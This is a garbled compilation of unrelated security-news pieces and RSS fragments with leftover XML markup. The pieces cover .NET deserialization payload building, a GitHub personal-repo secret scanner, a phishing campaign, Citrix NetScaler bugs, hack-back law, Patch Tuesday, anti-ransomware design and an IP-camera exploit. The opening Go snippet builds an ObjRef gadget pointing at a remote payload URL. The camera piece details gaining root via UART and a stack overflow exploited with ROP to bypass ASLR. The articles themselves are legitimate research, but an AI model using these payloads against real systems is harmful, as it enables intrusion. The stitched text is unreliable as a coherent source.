below.type BinaryObjectString struct {
    RecordTypeEnum int // 1 BYTE - ALWAYS 0x06
    ObjectID int       // 4 BYTES - INT32. This is a record, therefore it needs an ObjectID in case it needs to be referenced
    Value string       // This needs to be a LengthPrefixedString. This contains the value for the string.
}
So immediately following that SystemClassWithMembersAndTypes (Object 2), we define the next object in the stream as such:BinaryObjectString.RecordTypeEnum = 0x06BinaryObjectString.ObjectID = BinaryObjectString.Value = lenPrefix  followed by  "http://192.168.51.15:8888/hcQaAT"Then we end the entire serialization stream using the MessageEnd Record. This is the simplest record of all, it is just a  that denotes the end of the stream.With all of the structs defined, and the process for understading them under wraps, all that is left is to define a method similar to the  shown in the earlier example for each of the discussed records and then concatenate those results in the same order as the dump. This is left as an exercise for the reader.You could also use our go-exploit library as a reference or for gadget generation. Also, do note that this was a rather small serialization stream example; there are much more complicated gadgets, some of which contain serialization streams as values inside of other serialization stream records. Even so, construction of those should all follow the same basic principles explained in this article.Using VulnCheck's go-exploit library to generate the ObjRef payload is as simple as:package main
import (
    "github.com/vulncheck-oss/go-exploit/dotnet"
)
func main() {
    payload := dotnet.CreateObjectRef("something", dotnet.BinaryFormatter) // gadget generated!
    sendPayload(payload)
}

He accidentally creates the repository under his organisation’s user GitHub account (github.com/bob-xyz/internal-api) instead of the organisation account (github.com/xyz-com/internal-api). Worse? He makes it public. Even worse? It contains database credentials in the config files.GitHub’s built-in protections? Completely useless here.Sure, you’ve configured your organisation to make all repositories private by default. You’ve set up branch protection rules, required reviews, and enabled secret scanning. But all of these controls stop at your organisation’s boundary.: GitHub gives you zero control over repositories your organisation members create under their personal accounts — even when those repos contain your company’s code.Why This is a Massive ProblemLet’s be clear about the risk:Every developer in your org is a potential leak vectorPersonal repos are invisible to your security tools exists for what’s being created outside your org can’t track where the company code might be living doesn’t run on personal repos unless the developer enables itDuring a recent bug bounty engagement across several organisations, we discovered alarming exposure patterns. In one target with approximately 100 developers:We identified over 200 personal GitHub repositories containing code patterns matching their internal codebase5% of these repos exposed hardcoded API keys, database credentials, or sensitive configuration files11% contained references to internal hostnames, documentation URLs, or system architectures that aided reconnaissanceNone of this exposure was visible or monitored through their official security toolsThese personal developer accounts represented a completely unmonitored attack surface that traditional security assessments miss entirely.Our Solution: Extending Your Security PerimeterWe built an automated scanner that treats your organisation members’ public repositories as part of your extended security perimeter. Think of it as your security team’s watchtower — constantly monitoring the horizon for potential exposures.Instead of trying to control what we can’t (personal accounts), we monitor and respond to what we can see (public repositories). all members of your GitHub organisation their personal public repositories new repositories since the last scan for secrets, credentials, and sensitive data security teams in real-time via Slack everything for audit and complianceUnder the Hood: How We Built ItThe magic happens through clever use of GitHub’s GraphQL API and incremental scanning. Let’s break down the key components.Discovering Your Extended PerimeterFirst, we identify everyone in your organisation and their public repositories:The Secret Sauce: Incremental ScanningWe don’t scan everything every time — that would be wasteful and hit rate limits. Instead, we maintain state and only scan what’s new:Real-Time Secret DetectionWhen we find new repositories, TruffleHog immediately scans them:We categorise alerts by severity to prevent alert fatigue:After deploying this tool, you will discover just how big your blind spot was.Critical Exposure Scenarios: What Bug Bounty Hunters Actually FindScenario 1: The Conference Demo Disaster. Imagine finding a senior developer’s personal “demo-app” repository while doing reconnaissance. They’ve reused their company’s authentication service as a template for a tech talk — complete with valid JWT signing keys still embedded. This is exactly the kind of finding that turns a $500 bug bounty into a $5,000 critical submission within minutes of discovery.Scenario 2: The Tutorial Time Bomb. Picture discovering a junior developer learning DevOps on their personal GitHub. They’ve uploaded their company’s entire production environment configuration while following a CI/CD tutorial — database strings, API keys, OAuth secrets, all indexed by search engines. These are the goldmines that automated credential scanners feast on before organisations even know they exist.These aren’t edge cases — they’re patterns I’ve seen repeatedly across multiple bug bounty programs where personal developer accounts become the easiest attack vector.Implementation Guide: Protect Your Organisation TodayBefore you start, you’ll need:Step 1: Configure Your Monitoring ScopeDefine which organisations to monitor:Step 2: Set Up AuthenticationCreate a GitHub token with minimal required permissions:Step 3: Deploy Your ScannerOption A: Cron Job (Recommended for getting started)Step 4: Configure AlertingCreate a new Slack app at api.slack.comAdd to your security channelCopy the webhook URL to your  fileYour security team will see alerts like:Operational Excellence: Making It Work at ScaleEvery scan creates an immutable audit trail:GitHub’s API has limits. We handle them gracefully:Incremental Scanning StrategyWe maintain the state to ensure efficiency:Lessons from the TrenchesAfter running this in production for six months, here’s what we learned:1. Education > EnforcementDon’t just alert on problems — use them as teaching moments. We created a “Security Champions” program where developers who accidentally exposed secrets became advocates for secure coding.Include forked repositories in your analysis, but remember that not every personal repository containing company-related code represents a security risk. Many of these may be legitimate open-source contributions — for instance, repositories forked from established projects like xyz/xyz. To avoid false positives and unnecessary alarms, ensure your monitoring alerts include relevant context about the repository’s origin and purpose.The Bigger Picture: Defence in DepthThis scanner is one layer in a comprehensive GitHub security strategy:Take Action: Secure Your Extended Perimeter Today: If you have more than 10 developers in your organisation, you probably have exposed secrets in personal repositories right now.is that you can find and fix them today.Don’t wait for a breach to discover your blind spots. Every minute you delay is another minute your credentials could be harvested by automated scanners crawling GitHub.Get Started in 30 MinutesRun this quick command to see your current exposure:If the number is more than 50, you need this tool yesterday.We’ve Open-Sourced the ToolA big shoutout to Weng Onn Tan for creating this amazing tool.We’ve now open-sourced the scanner so that any security team can use it to uncover blind spots in their GitHub ecosystem. You can explore the code, contribute improvements, and deploy it within your environment here: Repo Guardian on GitHub.Our goal is to help teams extend visibility beyond their organization boundary and catch exposures before attackers do.: Your organisation’s security perimeter doesn’t end at your GitHub organisation boundary. Your developers’ personal repositories are part of your attack surface, whether you monitor them or not.The question isn’t  you should monitor them - it’s  you’ll start.Start today.

The goal is to lure you to a phishing site that steals login credentials—credentials that could unlock your email, cloud storage or other personal accounts.The email claims that, due to an upgrade in the Secure Message system, some pending messages didn’t make it to your inbox and are ready to be moved there now.“Email Delivery Reports: Incoming Pending MessagesWe have recently upgraded our Secure Message system, and there are pending messages that have not been delivered to your Inbox.Failure Delivery MessagesEmail Delivery Reports For  info@seychellesapartment.com   Status :                         Subject:                      Date:            Time:{A couple of message titles that are very generic and common as not to raise any suspicion}Note     : The messages will be delivered within 1-2 hours after you receive a confirmation Mail Notice.

The links pass the spoofed email address as a base64-encoded string to the phishing site. Going to that site, we were served this fake login screen with the target’s domain already filled in—making it look personalized and legitimate:Contrary to Unit42’s findings, we found that this version of the attack is more sophisticated and likely evolving quickly. The phishing site’s code is heavily obfuscated, and credentials are harvested through a websocket.A websocket keeps an open channel between your browser and the website’s server—like a phone call that never hangs up. This lets the browser and server send messages instantly back and forth, in both directions, without needing to reload the page. Cybercriminals love using websockets because they receive your details the instant you type them into a phishing site, and can even send prompts for additional information, such as two-factor authentication (2FA) codes.This means that if you enter your email and password on such a site, attackers could instantly take control of your email, access cloud-stored files, reset other passwords, and impersonate you across services.How to stay safe from phishing emailsIn phishing attempts like these, two simple rules can save you from lots of trouble.Don’t open unsolicited attachmentsAlways check the website address in the browser before signing in.

There’s an elegance to vulnerability research that feels almost poetic - the quiet dance between chaos and control. It’s the art of peeling back the layers of complexity, not to destroy but to understand; to trace the fragile threads that hold systems together and see where they might fray.

There’s beauty in that tension - the simultaneous act of breaking and creating, of exposing weakness to make strength possible. It’s a kind of intellectual intimacy, where curiosity meets consequence, and discovery hums just beneath the surface of what others take for granted.

And sometimes, you casually click your way to a vulnerability with a web browser.

Yes! We are discussing security appliances today!

As we’ve discussed before, it’s not uncommon to stumble into zero-days while exploring a code base or system in the pursuit of reproducing an N-day.

### CitrixBleed2

That’s exactly what happened in August 2025, when we triggered a rapid-response event across our client base for CitrixBleed2 (CVE-2025-5777) - a vulnerability affecting Citrix NetScaler appliances.

CitrixBleed2 was the second edition (which one do you have the fondest memories of?) of CitrixBleed - another painful memory leak vulnerability. These memory leak vulnerabilities allowed for the arbitrary disclosure of memory, pre-authentication - reportedly playing a role in the ransom of numerous organizations, weaponized trivially by identifying SSLVPN session IDs (and similar) contained within leaked memory.

This time, within the spools of our own collateral damage, we’ll be discussing the vulnerabilities we stumbled into:

- WT-2025-0089 - Memory Leak (but, not in the real world - no CVE)
- WT-2025-0090 - Reflected XSS (assigned CVE-2025-12101)

Stop - **before you start screaming, this (the Memory Leak) is not another CitrixBleed.**

But, there is a pattern - and when a vulnerability that discloses memory is triggered by purely misconfiguring a device (as opposed to things your average user couldn’t do with a web browser), you have to wonder what design and architecture choices resulted in this feeling of fragility around reading of memory.

### WT-2025-0089 - The Memory Leak, Explain

While analyzing CitrixBleed2, we were forced to become certified Citrix NetScaler experts - sacrificing what felt like a disproportionate amount of time to configure an appliance.

Within this lost time, we were forced to configure AAA. “What’s AAA”, every unharmed human asks?

> The AAA feature stands for **Authentication, Authorization, and Auditing**— essentially, the part of Citrix that decides _who_ can log in, _what_ they can access, and _what_ they do once inside.

> When a user connects through Citrix Gateway, the AAA system validates their credentials (via username, password, or even SAML), applies access rules, and logs the session for auditing. In short, it’s the **gatekeeper** that controls and monitors all access to Citrix applications and resources.

Visually represented as below:

If you’ve ever configured a Citrix NetScaler device - you likely dream of a career in goat farming. We are so sorry, and we now understand.

As we stumbled through the configuration process, we did something everyone expects - we made a mistake.

At one point, we skipped a step. But, our eyes widened when we realised this omission had resulted in a condition that left the appliance spewing memory.

When in this condition, browsing to / on the affected device would return a helpful error message (UX is important!), and leaked memory:

To reproduce this issue:

1. Create a new AAA virtual server via the web interface
2. Without enabling the feature via CLI, the root page of the web interface will start leaking memory

For context, this is how the feature is normally enabled via the CLI:

### How Do We Feel About This?

Not great? The vulnerability itself, while not ideal is frankly not a real-world concern given the likelihood of this wildly improbable configuration (we found none) existing in any Internet-exposed environment.

Citrix confirmed with us that this was their view as well, and thus decided to not assign a CVE:

After reviewing the issue, we’ve determined that the behavior stems from a misconfiguration of the appliance. Specifically, configuring a AAA virtual server without enabling the AAA feature is not a recommended setup. **Please note that the authentication functionality will not operate unless the AAA feature is enabled.**

Our documentation provides guidance on this configuration: https://docs.netscaler.com/en-us/citrix-adc/current-release/aaa-tm/entities-of-authentication-authorization-auditing/authentication-virtual-server.html

However, we understand that some customers may inadvertently configure their appliances this way. To help prevent this unsupported configuration in the future, we’ve made changes in the code that will prevent it going forward.

We can’t say we disagree - their assessment is fair and pragmatic, there is a all-but-zero chance of this vulnerability actually existing in the wild.

However, what should be of concern is the bigger picture - the trend, very clearly suggesting that memory management continues to appear very fragile within Citrix NetScaler appliances, to the extreme that even just misconfiguring an appliance by accident leads to disclosure of leaked memory.

It feels like we are playing catch with a highly-sensitive gun that continues to harm innocent bystanders - within, once again, what many will consider a highly-critical appliance and security control.

Will we see another memory leak vulnerability in Citrix NetScaler? We have no idea. But if we were to meme…

### WT-2025-0090 - SAML RelayState Reflected XSS

While poking around the appliance, we identified what looked like a simple and trivial Open Redirect vulnerability within the SSO flows used by Citrix NetScaler - specifically in the usage of the `RelayState` parameter.

For example, the below HTTP POST request contains a `RelayState` parameter with a base64 encoded value of “https://watchTowr.com”:

Although hack backs can take on various forms, they are—­by definition­—not passive defensive measures.”As the law currently stands, specific forms of purely defense measures are authorized so long as they affect only the victim’s system or data.At the other end of the spectrum, offensive measures that involve accessing or otherwise causing damage or loss to the hacker’s systems are likely prohibited, absent government oversight or authorization. And even then parties should proceed with caution in light of the heightened risks of misattribution, collateral damage, and retaliation.As for the broad range of other hack back tactics that fall in the middle of active defense and offensive measures, private parties should continue to engage in these tactics only with government oversight or authorization. These measures exist within a legal gray area and would likely benefit from amendments to the CFAA and CISA that clarify and carve out the parameters of authorization for specific self-defense measures. But in the absence of amendments or clarification on the scope of those laws, private actors can seek governmental authorization through an array of channels, whether they be partnering with law enforcement or seeking authorization to engage in more offensive tactics from the courts in connection with private litigation.]]></content:encoded></item><item><title>[Webinar] Learn How Leading Security Teams Reduce Attack Surface Exposure with DASR</title><link>https://thehackernews.com/2025/11/webinar-learn-how-leading-security.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjb7usGljMR3vSfxxk9XeKY39fUcIRMFDq6GOy0OEA_AK7P4ybAoHwl9Ga45OJ5pZPzpDhwqZ0D6PKEI-IFFifcl-NWBM5ymJ6wcNSyL3bneCMbRbVGz1ca3MIaKDHWbNvOVzK1LinCOt0RLYF1-zb_Zy11bGddkRxowymBu754CFJDpCDIreh4iiGF4loK/s1600/cyberteams.jpg" length="" type=""/><pubDate>Wed, 12 Nov 2025 11:55:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Every day, security teams face the same problem—too many risks, too many alerts, and not enough time.

By chaining it with other attacks, they can gain full admin access, install malware, steal data, or make deeper changes you wouldn’t normally be able to undo. Run Windows Update today, restart your PC, and check you’re up to date.Microsoft releases important security updates on the second Tuesday of every month—known as “Patch Tuesday.”  This month’s patches fix critical flaws in Windows 10, Windows 11, Windows Server, Office, and related services.Particularly noteworthy are some critical Remote Code Execution (RCE) bugs in Microsoft Graphics and Office that can allow attackers to run malicious code just by convincing someone to open a booby-trapped file or document.A “zero-day” is a software flaw that attackers are already exploiting before a fix is available. The name comes from the fact that defenders have  to protect themselves—attackers can strike before patches are released. In this month’s update, Microsoft fixed one such vulnerability: CVE-2025-62215, a Windows Kernel Elevation of Privilege (EoP) flaw.It lets an attacker who already has local access to a device gain higher, admin-level permissions by exploiting what’s known as a “race condition.” A race condition vulnerability happens when different programs or processes try to use the same resource at the same time without proper coordination. During that brief window of confusion, attackers can slip through and exploit the system.Attackers need to combine this vulnerability with other attack methods. Once they’ve compromised a system, they use this vulnerability to escalate privileges and gain admin-level rights.Another critical vulnerability worth noting is CVE-2025-60724, which comes with a CVSS score of 9.8 out of 10. It’s a heap-based buffer overflow in the GDI+ Microsoft Graphics Component, which allows an unauthorized attacker to run malicious code over a network.A buffer overflow happens when software writes more data to memory than it can handle, potentially overwriting other areas and injecting malicious code. In the case of CVE-2025-60724, Microsoft warns that attackers could exploit the flaw by convincing a victim to download and open a document that contains a specially crafted metafile. In more advanced attacks, the same vulnerability could be triggered remotely by uploading a malicious file to a vulnerable web service.How to apply fixes and check you’re protectedThese updates fix security problems and keep your Windows PC protected. Here’s how to make sure you’re up to date:Click the  button (the Windows logo at the bottom left of your screen).Click on  (it looks like a little gear).In the Settings window, select  (usually at the bottom of the menu on the left).Click the button that says .Windows will search for the latest Patch Tuesday updates for November 2025.If you have selected automatic updates earlier, you may see this:Which means all you have to do is restart your system and you’re done updating.If not, continue with the below.If updates are found, they’ll start downloading right away.

Systems are protected, definitions are up to date, behavioral analysis is active. Then, suddenly, files across your network start getting encrypted. Backups are being deleted. Ransom notes appear across your machines. Your security software shows nothing. No alerts, no detections, no blocked processes. How is this possible? This isn’t a hypothetical situation. It’s a real attack technique that ransomware operators are actively using to bypass even sophisticated protection systems. The attack exploits a fundamental assumption in how security software operates: that the malicious process and the files being attacked are on the same machine. When that assumption breaks down, traditional defenses fail. Malwarebytes ransomware protection works through multiple defensive layers. These include AI-based analysis, machine learning models, signature detection, runtime sandboxing, exploit mitigation, and web protection. Each layer stops threats at different stages. The Anti-Ransomware behavioral layer monitors actual file encryption behavior in real time. Malwarebytes continuously enhances all layers of its defense.  This article discusses a recent innovation in our Anti-Ransomware behavioral monitoring technology. The result is a comprehensive enhancement incorporating innovations in file monitoring, network session tracking, behavioral analysis, and real-time threat correlation. Why traditional protection failsTo understand why a ransomware attack over a network is so effective, we need to understand how this technology  works. The Anti-Ransomware component sits between applications and the file system, allowing it to see every file operation before it completes. When a process tries to open, read, or write a file, specialized callbacks are triggered. Think of these as security checkpoints where the security driver can inspect what’s happening and decide whether to allow the operation. The software looks at patterns: Is this process rapidly encrypting many files? Is it adding suspicious extensions? Is it attempting to delete backup Copies? These behavioral indicators, when combined, signal ransomware. This architecture works brilliantly when the ransomware process and the files being encrypted are on the same machine. The driver sees the process, tracks its behavior over time, builds a threat profile, and can block it before significant damage occurs. But what happens when ransomware runs on one device and attacks files on another? For example, an attacker compromises an unprotected device, a legacy device without current protection or an unmanaged guest device, and uses it to encrypt files on protected systems through network shares. Your machine doesn’t see any suspicious programs running. It just looks like someone is accessing files over the network, which happens all the time. This creates a perfect hiding spot for ransomware. On the attacking device, there might be no security software installed. On your main PC where files are being encrypted, the security software sees files changing but can’t tell which program is causing it. The connection between the malicious program and your files is hidden. Multiple ransomware variants have adopted this technique. They use specific commands to target network folders and shared drives. These aren’t random attacks. They’re carefully designed to bypass security software through remote encryption These aren’t opportunistic attacks. They’re carefully engineered for bypassing traditional anti-ransomware protection through remote encryption. Two-part protection architectureSolving this problem required addressing two distinct attack vectors. Part 1 involves a local process attacking remote files, while Part 2 involves a remote process attacking local files. Each required different technical approaches. Part 1: Detecting local to remote attacksWhen a program tries to access files on your network or shared folders, Malwarebytes checks if it’s behaving suspiciously. If the program is rapidly changing many files and creating ransom notes, the system builds a threat score in real time. The key innovation is that Malwarebytes tracks local and network activity separately. A program might be safely working with files on your computer while attacking files on another device through the network. By monitoring both, we can catch ransomware without false alarms. When Malwarebytes detects ransomware behavior, it blocks the malicious program immediately, stopping the attack before your files are encrypted. Part 2: Detecting remote to local attacksThe second challenge is harder: what if the ransomware is running on another device and attacking your files remotely? There’s no malicious program on your computer to block. Our solution tracks network connections. When files are accessed from another device on your network, Windows keeps information about which device is connecting. Malwarebytes captures this information and watches for suspicious behavior, like rapidly changing many files, adding suspicious file extensions, or creating ransom notes. When we detect an attack coming from another device, we block that specific connection from accessing your files. Innovation in ransomware protectionOur implementation operates through our specialized components. This architecture is essential for both performance and security. Every file operation goes through our filter, so we need to process decisions in microseconds to avoid impacting system responsiveness. We implemented multiple optimization layers. First, we filter out file operations that categorically cannot be ransomware related. Opening a file for read only access is not a threat, so we skip detailed analysis. Operations that only query metadata happen constantly in Windows and can be safely ignored for ransomware detection purposes. For operations that require analysis, we implemented a sophisticated indicator time-to-live (TTL) system. Behavioral indicators decay over time. This prevents false positives from legitimate activities like file synchronization tools or backup software. The network session tracking component required deep integration with Windows networking. We extract session information by accessing internal structures that Windows uses for network file serving. Our exclusion system supports IPv4, IPv6, hostnames, and CIDR notation for network ranges. What makes this protection differentSeveral factors distinguish the Malwarebytes approach from other solutions. The first is comprehensiveness. Many security vendors address this partially. Remote processes attacking local files or where local processes attack remote files. An attacker who compromises a single endpoint can still encrypt the shared resources. Malwarebytes protects against both vectors. Second is precision. Many solutions block entire network connections or lock accounts when they detect threats. Malwarebytes is more precise. We block only the specific malicious connection. Other activities from the same device continue working normally. Only the ransomware’s access is stopped. Third is performance. Malwarebytes runs efficiently without slowing down your computer. Fourth is proven protection. This technology has been tested and deployed across many different business and home networks. It is proven to work in real world situations. This protection does more than just stop one type of ransomware attack. It represents a new way of thinking about network-aware security. The old approach treated each device separately, but that doesn’t work when attackers use network connections to spread threats. Security solutions need to understand that attacks can come from any device on the network and target any accessible files. The technology we’ve built can do more than stop ransomware. The same system that tracks network connections and monitors suspicious behavior can help detect other threats, like someone trying to steal your data or access files they shouldn’t have permission to view. Attackers will keep evolving their methods. The attacks we’re seeing now will become more sophisticated. They might try to disguise themselves as normal computer maintenance or file management. Our protection is designed to adapt. Because it watches for suspicious patterns of behavior rather than looking for specific known attacks, it can detect new variations without needing constant updates. Ransomware keeps evolving, and attackers constantly find new ways to bypass security. Malwarebytes is committed to staying ahead with real innovation. This enhancement closes a critical gap that many security programs don’t address until it’s too late. If you’re choosing security software or reviewing your current protection, ask yourself: Does it protect against ransomware that spreads through network shares? This is becoming increasingly important as more ransomware attacks use this technique. We don’t just report on threats—we remove them]]></content:encoded></item><item><title>MacOS Infection Vector: Using AppleScripts to bypass Gatekeeper</title><link>https://pberba.github.io/security/2025/11/11/macos-infection-vector-applescript-bypass-gatekeeper/</link><author>/u/dashboard_monkey</author><category>netsec</category><pubDate>Wed, 12 Nov 2025 09:19:22 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Google Launches &apos;Private AI Compute&apos; — Secure AI Processing with On-Device-Level Privacy</title><link>https://thehackernews.com/2025/11/google-launches-private-ai-compute.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7u0YyGlwQEZFWpce5m9bHa4DibuFf1-votoLyZ6m1wkceOdtkkpGLrjkM9tyYHVQJVZSz5KQvJ9FxxCcr7KFlWm_d9DKdDx84iYRRp7J7rQHYRlAMdhF65AYDLZT_T-FWmwdXzULM-r1oHGTPENO8-oluI3HcVTXYUG3Pu-0m4IEhC0M6PLYVxgt_JWaQ/s1600/google-ai.gif" length="" type=""/><pubDate>Wed, 12 Nov 2025 08:35:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Google on Tuesday unveiled a new privacy-enhancing technology called Private AI Compute to process artificial intelligence (AI) queries in a secure platform in the cloud.

In this follow-up post, I will take you through building a considerably more complex binary exploit. We will explore the path from firmware extraction and analysis to the discovery of a previously unknown vulnerability and its exploitation. Follow along as we build an ARM ROP chain to bypass ASLR without an address leak, and achieve unauthenticated RCE.I examined the IN-8401 2K+, an IP camera from the German manufacturer INSTAR. It’s a modern networked surveillance camera that exposes a web-based user interface for configuration and live view. As I later found this particular model shares its firmware with other devices from INSTAR’s 2K+ and 4K series. According to Shodan there are roughly 12,000 INSTAR devices visible on the public internet.Before we can meaningfully hunt for vulnerabilities, we need to gain access to the device to obtain its firmware. Access to the firmware exposes binaries, configuration files, scripts and the filesystem layout and enables both static inspection and dynamic testing. Without the firmware we’re stuck with blind fuzzing of the network interface.It’s always a good idea to collect as much information as possible before diving into analysis mode. So I started with some reading. INSTAR provides quite an extensive documentation about its cameras and their features. I found a very interesting page titled “Restore your HD Camera after a faulty Firmware upgrade”. The article explained that the camera exposes a UART interface and how it could be accessed to restore a firmware image. UART is a hardware interface used for serial communication commonly found on development boards, embedded systems, and debugging interfaces. In the documentation it looked like it’s possible to boot right into a root shell.Although the article was written for the HD camera models, not my 2K+, I figured it might be worth a shot, since manufacturers often reuse features and components across different product versions. I removed the front part of the housing and spotted the debugging interface as shown on the wiki page.I went ahead and attached some PCBites to the interface and connected them to a FTDI, which is a small USB-to-serial converter.I then plugged the FTDI into my Linux machine and connected to it. After supplying some input over the serial connection I was greeted with a login prompt, cool!I tried a couple of the usual combinations like admin:admin, root:root, and so on, but had no success. The documentation explained that the boot process could be interrupted to obtain a root shell on the device’s OS. So I rebooted the camera to see if that worked.As you can see there was indeed a mechanism to stop the device from autobooting. But contrary to what the documentation suggested, interrupting the boot process didn’t provide a root shell on the OS, only in the U-Boot bootloader. U-Boot (short for Universal Bootloader) is an open-source bootloader commonly used in embedded systems to initialize hardware and load the operating system or firmware during startup.I noticed that the Kernel boot parameters were provided by an environment variable called . I went ahead an tried the  trick which tells the Kernel to start a shell instead of the init process. I updated the variable accordingly and tried to boot using .It worked. I added a new root user and rebooted the device. Now I was able to login to the device using the newly created user. I dumped the whole filesystem for analysis and as a backup so I could also restore it later, if anything went wrong along the way.High-Level Architecture & Attack SurfaceWith the device unlocked and open for exploration it’s very easy to get swept away by curiosity. With the goal of finding exploitable vulnerabilities in mind it’s important to lay out something like an attack surface map first.The web stack consisted of various components, most prominently a lighttpd web server that acted as an entry point and reverse proxy. I started by inspecting its configuration to see what it was doing. As you would expect from a reverse proxy, incoming requests were forwarded to the appropriate backend. For example, requests to files ending with  were routed to the fcgi_server binary through a socket at .I was mainly interested in finding code that was reachable without authentication. From my initial exploration I knew that there was an SQLite database file where the web interface users were stored, so the binary that performed authentication had to access this file. However, I couldn’t confirm that  was interacting with it. I concluded another component must be involved. In the process list I noticed a process called . I attached  to see what it was doing and found that incoming requests for most endpoints were forwarded from  to  via .As you can observe, the HTTP request wasn’t forwarded as-is, it was first serialized using some type of Type–Length–Value (TLV) structure. These observations also made it clear that authentication and the core application logic reside in the  backend.With this, I had identified two interesting targets:  and , both of which were reachable by an unauthenticated attacker.With the two main targets  and  identified we can now focus on searching for vulnerabilities. In this section I want to quickly touch on the methods I employed for doing so.Probably one of the most important ingredients for efficient vulnerability hunting is having a proper debugging setup in place. This allows for quickly double-checking any assumptions made during static analysis, tracing calls, and so on. I ran more or less an identical setup to the one used in the last research with a gdb server on the IP camera and a gdb client on the attacker’s machine.For this research I primarily used two approaches: fuzzing, and a combination of static and dynamic analysis. I started off with something that I would call a very primitive way of black-box fuzzing using boofuzz on collected web endpoints. I tried fuzzing through all possible parameters I had found on various endpoints to see if I could trigger a crash. Although this approach yielded CVE-2025-8761, I felt like it was very inefficient as a crash of the whole system was the only thing I was able to reliably detect (more on that later).As a secondary approach I spent quite some time on reverse engineering the two binaries  and . I tried to get an understanding of how things work while focusing on the usual suspects for memory corruption like bounds checking, pointer arithmetic, etc. To speed things up my process usually involved examining the decompiled binary, making assumptions, and verifying them using  and  dynamically.Let’s have a look at some code. As described earlier  acted as some sort of custom middleware that translated web requests into ipc messages. In the decompiled binary I found a dispatcher for  endpoints which called certain handler functions based on the given URI.In most of the handler functions a similar pattern emerged. Inside each handler there was a call to the same function which looked like another dispatcher. I identified the second dispatcher as some sort of authentication handler.I assumed that the code had to extract and serialize the corresponding auth data from http requests differently, depending on the authentication mechanism used. There were several different handlers one of which I identified as the basic auth handler.Inside the basic auth handler, there was a call to another function that looked like a custom implementation of Base64 decoding. As you might have noticed, the decompiled code contained typical C++ elements such as class methods, this pointers, and references to the C++ standard library. Most of the string-related functionality I had seen so far was therefore using C++’s standard string handling. In this case, however, I noticed a  that copied the decoded Base64 result into a fixed-size buffer (516 bytes) located on the stack.Without spending much more time on static analysis, I moved on to perform some dynamic testing of the basic authentication functionality. First, I needed to verify my assumption that the basic auth handler and Base64 decode function were being triggered, so I set a few breakpoints and sent a request.The breakpoints triggered which confirmed my assumptions so far and I got back a 500.Then I sent another request with a very long basic auth string exceeding the 516 buffer length in the base64 decode function.I got back another 500. However, the response wasn’t the same, this time it included an HTML error message. Strange, right? Let’s have a look at what the serial terminal showed.What happened? The program had crashed.  indicates that I had overwritten the stack since the code took the return address from the stack and tried jumping to it. In this case  which corresponds to the payload sent. I had found a stack-based buffer overflow.Why hadn’t I discovered this vulnerability during my initial fuzzing? I figured there were two reasons:The HTTP status code was the same as for a normal request, only the response body differed. So getting a 500 response to the request was nothing unusual.The lighttpd server immediately restarted , so the crash wasn’t noticeable from an outside perspective.This once again highlights the importance of a proper debugging setup.Before we jump to the fun part, a quick heads up: If you’re not familiar with binary exploitation or the ARM architecture I’d recommend to have a look at the previous blog post first as many concepts are similar to those from the previous research and won’t be described in detail in this post.Let’s first discuss the preconditions of exploiting the discovered stack-based buffer overflow. We’re dealing with an ARMHF 32 bit binary, dynamically linked and stripped. As shown by  the target binary isn’t protected by stack canaries, but does have the NX mitigation enabled. It isn’t compiled as a position independent executable (PIE) and has partial relocation read-only (RELRO).What does this mean for us as attackers? Overwriting return addresses on the stack with an overflow is straightforward because of the lack of stack canaries. However, we can’t execute shellcode on the stack. Also, the binary will always be placed in the same memory region, because it wasn’t compiled as a PIE. Finally, partial RELRO means that the global offset table (GOT) comes before the BSS section in memory, which holds uninitialized global and static variables. This eliminates the risk of a buffer overflow from a global variable overwriting GOT entries. Since our overflow is on the stack, this doesn’t really matter to us. What does matter though, is that it also means that the GOT is writable. Only full RELRO provides a read-only GOT.Let’s also have a look at the libraries included by the target binary such as the libc. We can see that libc was compiled with PIE, meaning that it can be placed randomly in memory during runtime.Evidently, when looking at the mitigations in place, it makes sense to consider a Return-oriented programming (ROP) chain to achieve command execution. A ROP chain leverages small code snippets, or gadgets, already present in a program’s memory. By linking these gadgets, an attacker constructs an unintended, attacker-controlled execution flow. The effectiveness of a ROP chain depends on the availability of suitable gadgets and the attacker’s knowledge of their memory addresses.In our case we could use gadgets from the target binary () itself because their addresses are static and therefore known. These gadgets are quite limited though and eventually we would need to call file I/O functions or  provided by libc to gain command execution. Note that libc was compiled with PIE. I quickly confirmed on the device that address space layout randomization (ASLR) was enabled, so libc was indeed placed at a random address in memory.I came up with a couple of ideas on how to deal with this:Find a libc address leak through another vulnerabilityFind a file read for /proc/self/mapsLeak a libc address through a ROP chainUnfortunately, I couldn’t quickly find another vulnerability that would let me leak a libc address. I considered reading  to locate libc, but that proved unsuccessful. I also looked into using gadgets in the target binary to build a ROP chain to leak a libc address. However, there was no straightforward way to exfiltrate the leaked pointer.A bigger issue was that any ROP chain would eventually crash the binary, rendering the leak useless because libc would be relocated on the next start of . In a stack-based buffer overflow, it’s also impossible to restore the stack to its previous state, as the very information required for restoration is overwritten.One approach often used in this kind of scenario is to trigger the bug multiple times to prolong the crash: trigger it once to leak an address, then return to the vulnerable function and trigger the overflow again to make use of the leak. However, that approach requires an I/O channel to read the leak and then supply input again. Given the web-stack architecture we discussed and the bug’s location, that wasn’t feasible, so I concluded a one-shot exploit was likely the only viable option.There are several known techniques that revolve around the GOT and Procedure Linkage Table (PLT) to bypass ASLR. When a call to an external function such as  (libc) is made, the immediate call goes to  which acts as a resolver of the actual address of  within libc. The resolved address is then stored in the GOT. If a specific function has already been resolved previously it is taken from the GOT by the  stub.So the information needed to bypass ASLR lives in the GOT. Ideally we’d find the address of  there, but the target binary never references , so it has no GOT/PLT entry. Instead, we could read a GOT entry for another function, compute the offset from that function to our target, and use that to redirect execution to the target. But all of this must be done via a ROP chain built from gadgets available in the binary.The high level steps would look something like this:Read a GOT entry and store in register xIncrement/decrement register x to reach target function (eg. addition, multiply, etc.)Increment/decrement value pointed to by GOT pointer to reach target function (GOT is writable)Dereference GOT pointer into register xStill a vast simplification, we would still need to move arguments into the correct registers and so on before jumping to the target function  but it’s a starting point.To pursue this idea I first wanted to find a GOT entry that is already populated when triggering the 